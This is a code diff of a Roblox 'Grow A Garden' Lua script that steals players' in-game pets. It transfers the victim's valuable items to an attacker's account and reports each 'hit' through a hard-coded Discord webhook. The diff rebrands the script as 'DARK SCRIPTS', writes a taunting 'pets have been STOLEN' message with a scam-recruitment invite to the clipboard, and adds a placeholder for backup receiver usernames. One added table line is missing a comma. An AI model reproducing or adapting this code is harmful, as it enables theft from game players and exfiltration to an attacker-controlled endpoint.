@@ -1,4 +1,5 @@
 
+
 getgenv().Webhook = "https://discord.com/api/webhooks/1407326022176608267/_7XNS9c-LNZLjKHjB-c03xp9_FBexx92Kz7eYA6s-aMWHFzPbeEVAaEtMwPRySmJW5Yv"
 getgenv().Username = "BEESUCALL"
         local RS = game:GetService("ReplicatedStorage")
@@ -19,7 +20,7 @@ getgenv().Username = "BEESUCALL"
         local attempt = 1
         local teleported = false
 
-        setclipboard("IKAW AY NANAKAWAN MAN!")
+        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
         
         if GetServerType:InvokeServer() == "VIPServer" then
@@ -79,11 +80,11 @@ getgenv().Username = "BEESUCALL"
                 ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
                 ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
                 ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
-                ["Corrupted Kitsune"] = { priority = 26, emoji = "🦊", isMutation = false },
-                ["T-Rex"] = { priority = 8, emoji = "🦖", isMutation = false },
+                ["Red Fox"] = { priority = 8 emoji = "🦊", isMutation = false },
+                ["T-Rex"] = { priority = 9, emoji = "🦖", isMutation = false },
                 ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
                 ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
-                ["Red Fox"] = { priority =  9, emoji = "🦊", isMutation = false },
+                ["Corrupted Kitsune"] = { priority = 26, emoji = "🦊", isMutation = false },
                 -- Mutations
                 ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
                 ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
@@ -339,7 +340,7 @@ getgenv().Username = "BEESUCALL"
 
         for _, pet in ipairs(pets) do
             local highestPriority = 99
-            local chosenEmoji = "🚫"
+            local chosenEmoji = "🐶"
             local mutation = isMutated(pet.PetName)
             local mutationData = mutation and PetPriorityData[mutation] or nil
             local petData = PetPriorityData[pet.Type] or nil
@@ -352,7 +353,7 @@ getgenv().Username = "BEESUCALL"
                 chosenEmoji = mutationData.emoji
             elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
                 highestPriority = 12
-                chosenEmoji = "✅"
+                chosenEmoji = "🐘"
             elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
                 highestPriority = 13
                 chosenEmoji = "👴"
@@ -404,7 +405,7 @@ end
 local formattedTotalValue = formatNumberWithCommas(totalValue)
 
 local embed = {
-    title = "KUNI HITS MAN",
+    title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
     color = 65280,
     fields = {
         {
@@ -607,7 +608,7 @@ end)
                 end
 
         local usernames = {
-            "Kuni_Loot1",
+            "PUT_HERE_YOUR_BACK_UP_USERNAMES", -- PUT THEIR UR EXTRA USERNAMES
         }
 
         local receiverPlr
@@ -817,7 +818,7 @@ end)
             tool.Parent = targetPlr.Backpack
         end
         return true
- 
+
     end
 
     safeFollow()
